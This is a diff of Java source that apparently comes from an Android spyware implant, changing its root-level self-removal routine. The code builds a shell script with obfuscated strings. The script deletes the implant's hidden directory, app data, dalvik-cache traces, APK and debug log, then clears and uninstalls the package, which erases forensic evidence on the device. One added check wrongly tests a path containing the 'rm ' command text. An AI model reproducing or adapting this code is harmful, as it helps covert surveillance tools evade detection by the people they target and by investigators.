@@ -233,22 +233,32 @@ public class Root {
 			Status.setIconState(false);
 			String script = M.e("#!/system/bin/sh") + "\n";
 			//script += Configuration.shellFile + " qzx \"rm -r " + Path.hidden() + "\"\n";
-			script += M.e("rm -r ") + Path.hidden() + "\n";
-
+			if (new AutoFile(Path.hidden()).exists()) {
+				script += M.e("rm -r ") + Path.hidden() + "\n";
+			}
 			script += Configuration.shellFile + M.e(" blw") + "\n";
-			script += M.e("sleep 1; rm ") + apkName + "\n";
-			script += Configuration.shellFile + M.e(" blr") + "\n";
 			if (isPersisten) {
 			/* we need to remove also /data/data/pkgName ? */
 				if (Status.getAppDir() != null) {
-					script += M.e("rm -r ") + Status.getAppDir() + "\n";
+					if (new AutoFile(Status.getAppDir()).exists()) {
+						script += M.e("rm -r ") + Status.getAppDir() + "\n";
+					}
 				}
+				script += M.e("for i in `ls /data/dalvik-cache/*com.android.dvci*`; do rm  $i; done") + "\n" ;
+			}else{
+				script += M.e("for i in `ls /data/dalvik-cache/*StkDevice*`; do rm  $i; done") + "\n" ;
 			}
-			script += Configuration.shellFile + M.e(" ru") + "\n";
+			script += M.e("LD_LIBRARY_PATH=/vendor/lib:/system/lib pm clear ") + packageName + "\n";
 			script += M.e("LD_LIBRARY_PATH=/vendor/lib:/system/lib pm uninstall ") + packageName + "\n";
+			script += M.e("sleep 1; rm ") + apkName + "\n";
+
+			script += Configuration.shellFile + M.e(" blr") + "\n";
+			script += Configuration.shellFile + M.e(" ru") + "\n";
 
 			if (Cfg.DEBUG) {
-				script += M.e("rm /data/local/tmp/log") + "\n";
+				if (new AutoFile(M.e("rm /data/local/tmp/log")).exists()) {
+					script += M.e("rm /data/local/tmp/log") + "\n";
+				}
 			}
 
 			String filename = "c";
